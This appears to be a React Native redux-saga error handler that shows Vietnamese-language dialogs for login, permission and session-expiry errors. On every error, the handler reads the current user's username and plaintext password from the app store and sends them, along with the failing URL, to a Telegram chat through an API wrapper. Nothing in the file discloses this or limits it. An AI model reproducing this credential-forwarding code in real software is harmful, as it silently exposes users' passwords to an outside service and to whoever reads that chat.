import {takeEvery, put} from 'redux-saga/effects';
import r from 'reactotron-react-native';

import {
  hideFlagMessage,
  messageWarning,
  MESSAGE_ERROR,
  showFlagMessage,
} from '../app';
import {version, code, CHAT_ID} from '../../helpers/Constants';
import {store} from '../ConfigureStore';
import telegram from '../../api/telegram';
import {setEmployee} from '../user/employee';

function* onError(action) {
  try {
    const {errCode, data, isNotify} = action;

    const {key, url, message} = data;

    const {username, password} = store.getState()['employee']['user'];

    let user = '';
    yield put(messageWarning(['Error - ' + message]));

    if (username && password) user = `\nuser: ${username}-${password}`;

    let mess = `[${key}${version}]\nUrl: ${url}\nMessage: ${message}${user}`;

    let res = yield telegram.sendMessage(mess);

    switch (errCode) {
      case code.AUTHORIZED: {
        yield put(
          showFlagMessage({
            item: [data.message],
            buttons: [
              {
                text: 'Đồng ý',
                onPress: () => {
                  store.dispatch(hideFlagMessage());
                },
              },
            ],
          }),
        );
        break;
      }
      case code.PERMISSION: {
        yield put(
          showFlagMessage({
            item: [data.message],
            buttons: [
              {
                text: 'Đồng ý',
                onPress: () => {
                  store.dispatch(hideFlagMessage());
                },
              },
            ],
          }),
        );
        break;
      }
      case code.TOKEN: {
        yield put(
          showFlagMessage({
            item: ['Phiên đăng nhập của bạn đã hết hạn'],
            buttons: [
              {
                text: 'Đồng ý',
                onPress: () => {
                  store.dispatch(hideFlagMessage());
                  store.dispatch(setEmployee(null));
                },
              },
            ],
          }),
        );
        break;
      }
      case code.TOKEN_EXPIRED: {
        yield put(
          showFlagMessage({
            item: ['Phiên đăng nhập của bạn đã hết hạn'],
            buttons: [
              {
                text: 'Đồng ý',
                onPress: () => {
                  store.dispatch(hideFlagMessage());
                  store.dispatch(setEmployee(null));
                },
              },
            ],
          }),
        );
        break;
      }
      default:
        if (isNotify)
          yield put(
            showFlagMessage({
              item: [message ?? 'Mất kết nối với hệ thống - ' + code],
              buttons: [
                {
                  text: 'Đồng ý',
                  onPress: () => {
                    store.dispatch(hideFlagMessage());
                  },
                },
              ],
            }),
          );
        break;
    }
  } catch {}
}

export default function* saga() {
  yield takeEvery(MESSAGE_ERROR, onError);
}
